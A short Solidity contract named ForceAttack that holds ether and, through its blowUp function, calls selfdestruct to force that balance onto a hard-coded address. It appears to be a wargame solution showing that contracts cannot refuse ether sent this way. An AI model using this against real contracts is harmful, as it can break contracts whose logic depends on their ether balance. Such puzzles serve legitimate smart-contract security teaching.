pragma solidity ^0.6.0;

contract ForceAttack {
    
    constructor() public payable {
        
    }
    
    function blowUp() public {
        selfdestruct(0xc6e9ab20CFA871857D579055d9CCC8664563225A);
    }
    
}
